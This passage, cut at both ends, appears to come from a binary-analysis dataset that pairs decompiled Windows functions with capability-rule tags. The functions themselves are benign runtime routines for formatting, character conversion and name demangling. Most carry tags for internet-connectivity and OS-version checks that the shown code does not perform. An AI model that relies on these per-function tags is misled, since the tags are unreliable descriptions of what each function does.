pcVar13 = *(unaff_EBP + -0x6c);\n            }\n            fcn.00401a32(pcVar13);\n        }\n        uVar14 = *(unaff_EBP + -0x58);\n    }\n    cVar2 = fcn.00403f7b(0x464592);\n    if (cVar2 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        cVar2 = *(arg_10h_00 + 5);\n        cVar4 = fcn.00401195();\n        if (cVar2 == cVar4) {\n            ppcVar9 = fcn.00401366();\n            arg_10h_00 = *(unaff_EBP + -0x74);\n            *pcVar11 = **ppcVar9;\n            pcVar11 = pcVar11 + 1;\n            *(unaff_EBP + -100) = pcVar11;\n            fcn.00401c5d();\n        }\n        else {\n            arg_10h_00 = *(unaff_EBP + -0x74);\n        }\n    }\n    if ((**(unaff_EBP + -0x7c) != 1000000000) && (*(unaff_EBP + -0x68) == 0)) {\n        cVar2 = fcn.00403f7b(uVar14);\n        if (cVar2 == '\\0') {\n            iVar12 = *(unaff_EBP + -0x5c);\n            do {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.004019e7();\n                }\n                if (*(arg_10h_00 + 5) != *(unaff_EBP + -0x20)) break;\n                *(unaff_EBP + -0x51) = 1;\n                iVar12 = iVar12 + -1;\n                fcn.00401c5d();\n                cVar2 = fcn.00403f7b(uVar14);\n            } while (cVar2 == '\\0');\n            *(unaff_EBP + -0x5c) = iVar12;\n            pcVar11 = *(unaff_EBP + -100);\n        }\n        iVar12 = *(unaff_EBP + -0x5c);\n        if (iVar12 < 0) {\n            *pcVar11 = '0';\n            pcVar11 = pcVar11 + 1;\n            *(unaff_EBP + -0x5c) = iVar12 + 1;\n        }\n    }\n    while (cVar2 = fcn.00403f7b(uVar14),  cVar2 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        uVar7 = fcn.00402eeb(unaff_EBP + -0x20, *(arg_10h_00 + 5));\n        if (9 < uVar7) break;\n        iVar12 = *(unaff_EBP + -0x68);\n        if (iVar12 < *(unaff_EBP + -0x84)) {\n            *pcVar11 = *(uVar7 + 0x54da00);\n            pcVar11 = pcVar11 + 1;\n            *(unaff_EBP + -0x68) = iVar12 + 1;\n        }\n        else if (uVar7 != 0) {\n            *(unaff_EBP + -0x53) = 1;\n        }\n        *(unaff_EBP + -0x51) = 1;\n        fcn.00401c5d();\n    }\n    pcVar13 = pcVar11;\n    if (*(unaff_EBP + -0x53) != '\\0') {\n        while (pcVar13 = pcVar13 + -1,  pcVar13 != *(unaff_EBP + -0x88)) {\n            *(unaff_EBP + -0x7c) = pcVar13;\n            ppcVar9 = fcn.00401366();\n            cVar2 = *pcVar13;\n            if (cVar2 != **ppcVar9) {\n                if (cVar2 != '9') {\n                    pcVar10 = *(unaff_EBP + -0x7c);\n                    *pcVar13 = cVar2 + '\\x01';\n                    pcVar13 = pcVar10;\n                    if (pcVar10 != *(unaff_EBP + -0x88)) goto code_r0x0046475d;\n                    break;\n                }\n                *pcVar13 = '0';\n            }\n        }\n        *(unaff_EBP + -0x5c) = *(unaff_EBP + -0x5c) + 1;\n        *pcVar13 = '1';\ncode_r0x0046475d:\n        uVar14 = *(unaff_EBP + -0x58);\n    }\n    cVar2 = *(unaff_EBP + -0x51);\n    pcVar13 = pcVar11;\n    if (cVar2 != '\\0') {\n        cVar2 = fcn.00403f7b(uVar14);\n        if (cVar2 == '\\0') {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.004019e7();\n            }\n            cVar2 = *(arg_10h_00 + 5);\n            if (cVar2 != *(unaff_EBP + -0x13)) {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.004019e7();\n                    cVar2 = *(arg_10h_00 + 5);\n                }\n                if (cVar2 != *(unaff_EBP + -0x14)) goto code_r0x0046489a;\n            }\n            *pcVar11 = 'e';\n            pcVar13 = pcVar11 + 1;\n            fcn.00401c5d();\n            *(unaff_EBP + -0x51) = 0;\n            iVar12 = 0;\n            cVar2 = fcn.00403f7b(*(unaff_EBP + -0x58));\n            if (cVar2 == '\\0') {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.004019e7();\n                }\n                cVar2 = *(arg_10h_00 + 5);\n                if (cVar2 == *(unaff_EBP + -0x15)) {\n                    *pcVar13 = '+';\n                }\n                else {\n                    if (*(arg_10h_00 + 4) == '\\0') {\n                        fcn.004019e7();\n                        cVar2 = *(arg_10h_00 + 5);\n                    }\n                    if (cVar2 != *(unaff_EBP + -0x16)) goto code_r0x00464800;\n                    *pcVar13 = '-';\n                }\n                pcVar13 = pcVar11 + 2;\n                fcn.00401c5d();\n            }\ncode_r0x00464800:\n            cVar2 = fcn.00403f7b(*(unaff_EBP + -0x58));\n            if (cVar2 == '\\0') {\n                do {\n                    cVar4 = *(arg_10h_00 + 4);\n                    cVar2 = *(unaff_EBP + -0x51);\n                    *(unaff_EBP + -0x51) = cVar2;\n                    if (cVar4 == '\\0') {\n                        fcn.004019e7();\n                        cVar2 = *(unaff_EBP + -0x51);\n                    }\n                    if (*(arg_10h_00 + 5) != *(unaff_EBP + -0x20)) {\n                        if (cVar2 == '\\0') goto code_r0x0046484f;\n                        break;\n                    }\n                    *(unaff_EBP + -0x51) = 1;\n                    fcn.00401c5d();\n                    cVar2 = fcn.00403f7b(*(unaff_EBP + -0x58));\n                } while (cVar2 == '\\0');\n                *pcVar13 = '0';\n                pcVar13 = pcVar13 + 1;\n            }\ncode_r0x0046484f:\n            do {\n                cVar2 = fcn.00403f7b(*(unaff_EBP + -0x58));\n                if (cVar2 != '\\0') break;\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.004019e7();\n                }\n                uVar7 = fcn.00402eeb(unaff_EBP + -0x20, *(arg_10h_00 + 5));\n                if (9 < uVar7) break;\n                if (iVar12 < 8) {\n                    *pcVar13 = *(uVar7 + 0x54da00);\n                    pcVar13 = pcVar13 + 1;\n                    iVar12 = iVar12 + 1;\n                }\n                *(unaff_EBP + -0x51) = 1;\n                fcn.00401c5d();\n            } while( true );\n        }\ncode_r0x0046489a:\n        cVar2 = *(unaff_EBP + -0x51);\n    }\n    if ((*(unaff_EBP + -0x54) != '\\0') || (cVar2 == '\\0')) {\n        pcVar13 = *(unaff_EBP + -0x78);\n    }\n    *pcVar13 = '\\0';\n    fcn.004029b9();\ncode_r0x004648b8:\n    fcn.004067d0();\n    return;\n}\n",
        "token_count": 5676
    },
    "00403c51": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403c51(int32_t param_1)\n\n{\n    uint *puVar1;\n    \n    if (*(param_1 + 0x14) != '\\0') {\n        *(param_1 + 0x14) = 0;\n    }\n    puVar1 = fcn.004039a4();\n    *puVar1 = 0x22;\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x14) = 0;\n    return 0x22;\n}\n",
        "token_count": 122
    },
    "00403cb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403cb0(int32_t arg_8h, uint32_t arg_ch, int32_t **arg_10h)\n\n{\n    uint arg_8h_00;\n    \n    if (arg_10h == NULL) {\n        arg_8h_00 = fcn.00404d04();\n        arg_ch = fcn.004060eb(arg_8h_00, arg_8h, arg_ch);\n    }\n    else if (arg_8h + 1U < 0x101) {\n        arg_ch = *(**arg_10h + arg_8h * 2) & arg_ch;\n    }\n    else if ((*arg_10h)[1] < 2) {\n        arg_ch = 0;\n    }\n    else {\n        arg_ch = fcn.00404287(arg_8h, arg_ch, arg_10h);\n    }\n    return arg_ch;\n}\n",
        "token_count": 204
    },
    "00403cba": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403cba(uint arg_8h)\n\n{\n    code **arg_8h_00;\n    int32_t *in_ECX;\n    \n    if ((*(in_ECX + 1) < '\\x02') && (arg_8h != '\\0')) {\n        if (*in_ECX == 0) {\n            *in_ECX = 0;\n            in_ECX[1] = 0;\n            fcn.0040448a(arg_8h);\n        }\n        else {\n            arg_8h_00 = fcn.004051dc(8);\n            if (arg_8h_00 == NULL) {\n                arg_8h_00 = NULL;\n            }\n            else {\n                *arg_8h_00 = vtable.charNode.0;\n                *(arg_8h_00 + 1) = arg_8h;\n            }\n            fcn.004056af(arg_8h_00);\n        }\n    }\n    return;\n}\n",
        "token_count": 216
    },
    "00403cdd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.00403cdd(uint16_t *lpWideCharStr, uint8_t *lpMultiByteStr, uint32_t arg_10h, uint noname_3, uint *arg_18h)\n\n{\n    uint8_t uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint16_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    unkbyte6 Var7;\n    uint32_t var_4h;\n    \n    if (arg_10h == 0) {\n        return 0;\n    }\n    uVar1 = *lpMultiByteStr;\n    uVar4 = uVar1;\n    if (uVar1 == 0) {\n        *lpWideCharStr = 0;\n        return 0;\n    }\n    var_4h = uVar1;\n    if (arg_18h[2] != 0) {\ncode_r0x00482864:\n        *lpWideCharStr = uVar4 & 0xff;\n        return 1;\n    }\n    iVar3 = arg_18h[1];\n    if (iVar3 == 1) {\ncode_r0x0048283d:\n        uVar5 = 1;\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(*arg_18h, 9, lpMultiByteStr, 1, lpWideCharStr, 1);\n    }\n    else {\n        if (iVar3 != 2) {\n            if (iVar3 == 4) {\n                Var7 = fcn.004828c1(&var_4h, var_4h);\n                uVar4 = Var7 >> 0x20;\n                iVar3 = Var7;\n                if (iVar3 == 0) goto code_r0x00482864;\n                if (iVar3 < 3) {\n                    uVar6 = 1;\n                    uVar5 = var_4h;\n                    do {\n                        if (arg_10h <= uVar6) {\n                            return 0xfffffffe;\n                        }\n                        if ((lpMultiByteStr[uVar6] & 0xc0) != 0x80) goto code_r0x00482854;\n                        uVar5 = uVar5 << 6 | lpMultiByteStr[uVar6] & 0x3f;\n                        uVar6 = uVar6 + 1;\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != 0);\n                    if (0x7ff < uVar5 - 0xd800) {\n                        *lpWideCharStr = uVar5;\n                        return uVar6;\n                    }\n                }\n                goto code_r0x00482854;\n            }\n            goto code_r0x0048283d;\n        }\n        uVar5 = 1;\n        if ((*((uVar1 >> 3) + 0xc + arg_18h) & 1 << (uVar1 & 7)) != 0) {\n            if (arg_10h == 1) {\n                return 0xfffffffe;\n            }\n            uVar5 = 2;\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(*arg_18h, 9, lpMultiByteStr, uVar5, lpWideCharStr, 1);\n    }\n    if (iVar3 != 0) {\n        return uVar5;\n    }\ncode_r0x00482854:\n    puVar2 = fcn.004039a4();\n    *puVar2 = 0x2a;\n    return 0xffffffff;\n}\n",
        "token_count": 793
    },
    "00403cec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403cec(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    \n    if (arg_8h == 1) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x21;\n    }\n    else if (arg_8h - 2U < 2) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x22;\n        return;\n    }\n    return;\n}\n",
        "token_count": 115
    },
    "00403cfb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403cfb(int32_t *param_1)\n\n{\n    uint *puVar1;\n    \n    if (*param_1 == 0) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 84
    },
    "00403d1e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403d1e(int32_t param_1)\n\n{\n    uint *puVar1;\n    \n    if ((*(param_1 + 0x1c) != 0) && (*(param_1 + 0x1c) != 7)) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 108
    },
    "00403d32": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00403d32(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t arg_8h_00;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t *var_4h;\n    \n    if ((5 < arg_8h) || (arg_ch == 0)) {\n        return NULL;\n    }\n    piVar1 = fcn.00404fd9(1, 8);\n    var_4h = piVar1;\n    if (piVar1 == NULL) {\n        puVar2 = fcn.004039a4();\n        piVar1 = NULL;\n        *puVar2 = 0xc;\n        goto code_r0x004ac456;\n    }\n    arg_8h_00 = fcn.00404fd9(1, 0xb8);\n    iVar4 = arg_8h_00;\n    if (arg_8h_00 == 0) {\n        puVar2 = fcn.004039a4();\n        piVar1 = NULL;\n        *puVar2 = 0xc;\n    }\n    else {\n        puVar2 = fcn.00404fd9(1, 0x220);\n        if (puVar2 == NULL) {\n            puVar3 = fcn.004039a4();\n            *puVar3 = 0xc;\ncode_r0x004ac442:\n            piVar1 = NULL;\n            puVar3 = puVar2;\n        }\n        else {\n            fcn.004abc3f(arg_8h_00, 0x56ce78);\n            iVar4 = fcn.004ac79d(arg_8h_00, arg_8h, arg_ch);\n            if (iVar4 == 0) {\ncode_r0x004ac432:\n                fcn.0040531c(arg_8h_00);\n                iVar4 = 0;\n                fcn.00406857(arg_8h_00);\n                goto code_r0x004ac442;\n            }\n            iVar4 = fcn.00405ca4(*(arg_8h_00 + 8), puVar2);\n            if (iVar4 != 0) goto code_r0x004ac432;\n            *puVar2 = 1;\n            iVar4 = 0;\n            *piVar1 = arg_8h_00;\n            puVar3 = NULL;\n            piVar1[1] = puVar2;\n            var_4h = NULL;\n        }\n        fcn.00406302(puVar3);\n    }\n    fcn.00406302(iVar4);\ncode_r0x004ac456:\n    fcn.00406302(var_4h);\n    return piVar1;\n}\n",
        "token_count": 619
    },
    "00403d5a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nchar * __cdecl fcn.00403d5a(char *arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t **ppiVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uchar *puVar6;\n    char *pcVar7;\n    uint var_10h;\n    int32_t *var_8h;\n    uint32_t var_4h;\n    \n    fcn.00401212(&var_8h);\n    if (var_4h == '\\x03') {\n        return NULL;\n    }\n    if ((var_4h == '\\x02') || (((*0x56f460 & 0x1000) == 0 && (**0x56f458 != '\\0')))) {\n        var_4h = var_4h & 0xffffff00;\n        ppiVar3 = fcn.004059e3(*0x56f45c);\n        var_8h = *ppiVar3;\n    }\n    if (arg_8h == NULL) {\n        if (var_8h == NULL) {\n            iVar4 = 0;\n        }\n        else {\n            pcVar2 = **var_8h;\n            (**0x573000)();\n            iVar4 = (*pcVar2)();\n        }\n        arg_ch = iVar4 + 1;\n        var_4h = arg_ch;\n        arg_8h = fcn.004065fa(arg_ch);\n        if (arg_8h == NULL) {\n            return NULL;\n        }\n    }\n    if (var_8h == NULL) {\n        *arg_8h = '\\0';\n    }\n    else {\n        pcVar5 = arg_8h;\n        if (arg_8h == NULL) {\n            pcVar2 = **var_8h;\n            (**0x573000)();\n            iVar4 = (*pcVar2)();\n            var_4h = iVar4 + 1;\n            pcVar5 = fcn.004051dc(var_4h);\n            arg_ch = var_4h;\n            if (pcVar5 == NULL) goto code_r0x00490c0a;\n        }\n        pcVar2 = *(*var_8h + 0xc);\n        (**0x573000)(pcVar5, pcVar5 + (arg_ch - 1));\n        puVar6 = (*pcVar2)();\n        *puVar6 = 0;\n    }\ncode_r0x00490c0a:\n    cVar1 = *arg_8h;\n    pcVar5 = arg_8h;\n    pcVar7 = arg_8h;\n    while (cVar1 != '\\0') {\n        pcVar7 = pcVar7 + 1;\n        if (cVar1 == ' ') {\n            *pcVar5 = ' ';\n            for (; *pcVar7 == ' '; pcVar7 = pcVar7 + 1) {\n            }\n        }\n        else {\n            *pcVar5 = cVar1;\n        }\n        pcVar5 = pcVar5 + 1;\n        cVar1 = *pcVar7;\n    }\n    *pcVar5 = '\\0';\n    return arg_8h;\n}\n",
        "token_count": 710
    },
    "00403d5f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403d5f(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t **in_ECX;\n    \n    piVar1 = *in_ECX;\n    if (piVar1[2] == piVar1[1]) {\n        if (*(piVar1 + 3) == '\\0') {\n            *arg_ch = -1;\n        }\n        else {\n            *arg_ch = *arg_ch + 1;\n        }\n        uVar2 = *in_ECX & 0xffffff00 | *(*in_ECX + 3);\n    }\n    else {\n        *arg_ch = *arg_ch + 1;\n        (*in_ECX)[2] = (*in_ECX)[2] + 1;\n        ***in_ECX = arg_8h;\n        piVar1 = *in_ECX;\n        *piVar1 = *piVar1 + 1;\n        uVar2 = CONCAT31(piVar1 >> 8, 1);\n    }\n    return uVar2;\n}\n",
        "token_count": 245
    },
    "00403daa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00403daa(uchar *arg_8h, int32_t arg_ch)\n\n{\n    uchar *puVar1;\n    int32_t *in_ECX;\n    \n    if (*in_ECX == 0) {\n        if (arg_8h != NULL) {\n            *arg_8h = 0;\n        }\n    }\n    else {\n        if (arg_8h == NULL) {\n            arg_ch = fcn.0040425a();\n            arg_ch = arg_ch + 1;\n            arg_8h = fcn.004051dc(arg_ch);\n            if (arg_8h == NULL) {\n                return NULL;\n            }\n        }\n        puVar1 = fcn.0040208b(arg_8h, arg_8h + arg_ch + -1);\n        *puVar1 = 0;\n    }\n    return arg_8h;\n}\n",
        "token_count": 197
    },
    "00403dc8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nushort __fastcall fcn.00403dc8(int32_t *param_1)\n\n{\n    code *pcVar1;\n    ushort uVar2;\n    \n    if ((*param_1[7] != NULL) && (0 < *param_1[0xb])) {\n        return **param_1[7];\n    }\n    pcVar1 = *(*param_1 + 0x18);\n    (**0x573000)();\n    uVar2 = (*pcVar1)();\n    return uVar2;\n}\n",
        "token_count": 109
    },
    "00403deb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00403deb(uint *arg_8h)\n\n{\n    char *pcVar1;\n    uint *arg_8h_00;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t arg_8h_01;\n    int32_t arg_ch;\n    uint var_2ch;\n    char *var_24h;\n    uint var_20h;\n    char *var_1ch;\n    code *var_18h;\n    uint var_14h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    pcVar1 = *0x56f458 + 1;\n    arg_ch = **0x56f458;\n    // switch table (16 cases) at 0x490422\n    switch(arg_ch) {\n    case 0x47:\n    case 0x48:\n    case 0x49:\n    case 0x4a:\n        goto code_r0x0049021f;\n    case 0x4b:\n    case 0x4c:\n    case 0x4f:\n    case 0x50:\n    case 0x51:\n        goto code_r0x00490405;\n    case 0x4d:\n        *0x56f458 = pcVar1;\n        fcn.004053d5(&var_24h);\n        pcVar1 = *0x56f458;\n        if (var_20h < '\\x02') {\n            fcn.00403deb(arg_8h);\n            goto code_r0x00490410;\n        }\n        goto code_r0x00490405;\n    case 0x4e:\n        var_24h = \"nullptr\";\n        arg_8h_00 = &var_24h;\n        var_20h = 7;\n        *0x56f458 = pcVar1;\ncode_r0x00490148:\n        fcn.00402cfc(arg_8h_00);\n        goto code_r0x00490410;\n    case 0x52:\n    case 0x54:\n    case 0x55:\n    case 0x56:\n        *0x56f458 = pcVar1;\n        fcn.0040622b(&var_24h);\n        fcn.00403daa(&var_14h, 0x10);\n        uVar3 = fcn.00406681(&var_14h);\n        if (((*0x56f460 & 0x4000) != 0) && (var_18h = *0x56f468,  *0x56f468 != NULL)) {\n            (**0x573000)(uVar3 & 0xfff);\n            arg_8h_01 = (*var_18h)();\n            if (arg_8h_01 != 0) {\n                var_18h = var_18h & 0xffffff00;\n                fcn.00404c46(arg_8h_01);\n                goto code_r0x00490410;\n            }\n        }\n        fcn.004054ed(&var_14h, 0x10, 0x54f41c, uVar3 & 0xfff);\n        var_18h = var_18h & 0xffffff00;\n        fcn.0040323d(&var_14h);\n        if ((arg_ch == 0x52) || (arg_ch == 0x54)) {\n            var_24h = \"`template-type-parameter-\";\ncode_r0x004903c2:\n            var_20h = 0x19;\n        }\n        else {\n            if (arg_ch == 0x55) {\n                var_24h = \"`generic-class-parameter-\";\n                goto code_r0x004903c2;\n            }\n            pcVar1 = *0x56f458;\n            if (arg_ch != 0x56) goto code_r0x00490405;\n            var_24h = \"`generic-method-parameter-\";\n            var_20h = 0x1a;\n        }\n        fcn.00402cfc(&var_24h);\n        fcn.004052f9(&var_24h, &var_1ch);\n        uVar2 = 0x27;\n        goto code_r0x004902ca;\n    case 0x53:\n        *0x56f458 = pcVar1;\n        *arg_8h = 0;\n        arg_8h[1] = 0;\n        goto code_r0x00490410;\n    }\n    if (arg_ch != 0x46) {\n        if (arg_ch < 0x37) {\n            if (arg_ch == 0x36) {\n                *0x56f458 = pcVar1;\n                fcn.00403f4e(arg_8h);\n                goto code_r0x00490410;\n            }\n            if (arg_ch == 0) {\n                fcn.004017df(1);\n                goto code_r0x00490410;\n            }\n            if (arg_ch == 0x30) {\n                *0x56f458 = pcVar1;\n                fcn.0040622b(arg_8h);\n                goto code_r0x00490410;\n            }\n            if (arg_ch == 0x31) {\n                if (*pcVar1 != '@') {\n                    var_1ch = NULL;\n                    var_18h = NULL;\n                    *0x56f458 = pcVar1;\n                    fcn.0040448a(0x26);\n                    uVar2 = fcn.00401d20(&var_24h);\n                    fcn.004052f9(arg_8h, uVar2);\n                    goto code_r0x00490410;\n                }\n                var_1ch = \"NULL\";\n                arg_8h_00 = &var_1ch;\n                var_18h = 0x4;\n                *0x56f458 = *0x56f458 + 2;\n                goto code_r0x00490148;\n            }\n            if (arg_ch == 0x32) {\n                *0x56f458 = pcVar1;\n                fcn.004067bc(arg_8h);\n                goto code_r0x00490410;\n            }\n            if (arg_ch == 0x34) {\n                *0x56f458 = pcVar1;\n                fcn.0040286f(arg_8h);\n                goto code_r0x00490410;\n            }\n            if (arg_ch == 0x35) {\n                *0x56f458 = pcVar1;\n                fcn.004051be(arg_8h);\n                goto code_r0x00490410;\n            }\n        }\n        else {\n            if (arg_ch == 0x37) {\n                *0x56f458 = pcVar1;\n                fcn.0040383c(arg_8h);\n                goto code_r0x00490410;\n            }\n            if (arg_ch == 0x38) {\n                *0x56f458 = pcVar1;\n                fcn.0040676c(arg_8h);\n                goto code_r0x00490410;\n            }\n            if ((arg_ch == 0x41) || (arg_ch == 0x42)) {\n                *0x56f458 = pcVar1;\n                fcn.00401712(arg_8h, arg_ch);\n                goto code_r0x00490410;\n            }\n            if (arg_ch == 0x43) {\n                *0x56f458 = pcVar1;\n                fcn.0040581c(arg_8h);\n                goto code_r0x00490410;\n            }\n            if (arg_ch == 0x45) {\n                *0x56f458 = pcVar1;\n                fcn.00401d20(arg_8h);\n                goto code_r0x00490410;\n            }\n        }\n        goto code_r0x00490405;\n    }\ncode_r0x0049021f:\n    var_1ch = NULL;\n    var_18h = NULL;\n    *0x56f458 = pcVar1;\n    fcn.0040448a(0x7b);\n    if (((arg_ch == 0x48) || (arg_ch == 0x49)) || (arg_ch == 0x4a)) {\n        uVar2 = fcn.00401d20(&var_24h);\n        fcn.00402eb9(uVar2);\n        fcn.00403cba(0x2c);\n    }\n    if (arg_ch == 0x46) {\ncode_r0x00490295:\n        uVar2 = fcn.0040622b(&var_24h);\n        fcn.00402eb9(uVar2);\n        fcn.00403cba(0x2c);\ncode_r0x004902b2:\n        uVar2 = fcn.0040622b(&var_24h);\n        fcn.00402eb9(uVar2);\n    }\n    else {\n        if (arg_ch == 0x47) {\ncode_r0x00490278:\n            uVar2 = fcn.0040622b(&var_24h);\n            fcn.00402eb9(uVar2);\n            fcn.00403cba(0x2c);\n            goto code_r0x00490295;\n        }\n        if (arg_ch == 0x48) goto code_r0x004902b2;\n        if (arg_ch == 0x49) goto code_r0x00490295;\n        if (arg_ch == 0x4a) goto code_r0x00490278;\n    }\n    uVar2 = 0x7d;\ncode_r0x004902ca:\n    fcn.004032bf(arg_8h, uVar2);\ncode_r0x00490410:\n    fcn.00403085(var_2ch);\n    return;\ncode_r0x00490405:\n    *0x56f458 = pcVar1;\n    arg_8h[1] = 0;\n    *arg_8h = 0;\n    *(arg_8h + 1) = 2;\n    goto code_r0x00490410;\n}\n",
        "token_count": 2278
    },
    "00403e5e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00403e5e(uint *arg_8h)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    char *pcVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_34h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    var_ch = 0;\n    var_8h = 0;\n    uVar6 = 0;\n    var_2h._0_1_ = '\\x01';\n    *0x56f465 = 1;\n    do {\n        pcVar3 = *0x56f458;\n        cVar1 = **0x56f458;\n        if ((cVar1 == '\\0') || (cVar1 == '@')) break;\n        var_14h = 0;\n        var_10h = 0;\n        var_2h._1_1_ = '\\0';\n        if (cVar1 - 0x30U < 10) {\n            *0x56f458 = *0x56f458 + 1;\n            piVar4 = fcn.00401ee7(&fcn.00403e5e::var_24h, cVar1 - 0x30U);\n            iVar7 = *piVar4;\n            iVar5 = piVar4[1];\n            var_14h = iVar7;\n            var_10h = iVar5;\n            goto code_r0x0048fdef;\n        }\n        if (cVar1 == '$') {\n            if ((*0x56f458)[1] != '$') {\ncode_r0x0048fd55:\n                if ((**0x56f458 != '$') || ((*0x56f458)[1] == '$')) goto code_r0x0048fd99;\n                *0x56f458 = *0x56f458 + 1;\n                piVar4 = fcn.00403deb(&fcn.00403e5e::var_2ch);\n                goto code_r0x0048fda2;\n            }\n            cVar1 = (*0x56f458)[2];\n            if (cVar1 == '$') {\n                if ((*0x56f458)[3] != 'V') goto code_r0x0048fd55;\n                *0x56f458 = *0x56f458 